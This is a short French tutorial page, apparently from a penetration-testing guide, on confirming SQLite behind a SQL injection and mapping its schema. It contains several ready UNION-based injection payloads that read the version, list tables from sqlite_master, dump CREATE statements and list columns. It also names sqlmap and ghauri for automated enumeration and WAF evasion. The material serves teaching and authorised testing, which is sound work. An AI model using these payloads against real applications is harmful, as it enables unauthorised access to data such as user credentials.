---
order: 2
title: "Fingerprinting et énumération dans l'injection SQLite"
description: "Orienter une injection SQLite : confirmer le moteur, lire la version et énumérer les tables et colonnes à partir des instructions CREATE stockées dans sqlite_master."
keywords:
  - fingerprinting SQLite
  - sqlite_version
  - sqlite_master
  - découverte du schéma
  - sqlite_schema
---

# Énumération

Confirmez que le moteur est SQLite et cartographiez le schéma. Une empreinte fiable est que `sqlite_version()` se résout alors que `information_schema` ne le fait pas : un payload qui lit `sqlite_master` mais provoque une erreur sur `information_schema.tables` pointe vers SQLite.

Lisez la version :

```sql
' UNION SELECT sqlite_version(),NULL,NULL-- 
```

Le schéma réside entièrement dans `sqlite_master` (aussi accessible via `sqlite_schema`). Listez les tables :

```sql
' UNION SELECT group_concat(name),NULL,NULL FROM sqlite_master WHERE type='table'-- 
```

L'avantage de SQLite pour l'énumération est que `sqlite_master.sql` stocke l'instruction `CREATE TABLE` complète de chaque objet, de sorte que les noms de colonnes reviennent sans catalogue de colonnes distinct :

```sql
' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE name='users'-- 
```

Le `CREATE TABLE users (id INTEGER, username TEXT, password TEXT)` renvoyé révèle chaque colonne. `pragma_table_info('users')` est une alternative qui liste les colonnes sous forme de lignes :

```sql
' UNION SELECT group_concat(name),NULL,NULL FROM pragma_table_info('users')-- 
```

Il n'y a aucun utilisateur ni rôle de base de données à énumérer, puisque SQLite n'en possède pas ; l'injection dispose simplement de l'accès dont dispose le handle de fichier de l'application. Une fois la version et le schéma connus, l'extraction se poursuit avec les techniques union, blind ou time-based.

## Outils

- **sqlmap** : fingerprinting et énumération de schéma automatisés (`--banner`, `--tables`, `--columns`).
- **ghauri** : alternative rapide avec une forte évasion de WAF.
- **sqlite3** : la CLI du moteur pour lire directement `sqlite_master`.

## Références

- Documentation SQLite : `sqlite_master`, `sqlite_version`, fonctions PRAGMA
- OWASP Testing Guide: Testing for SQL Injection
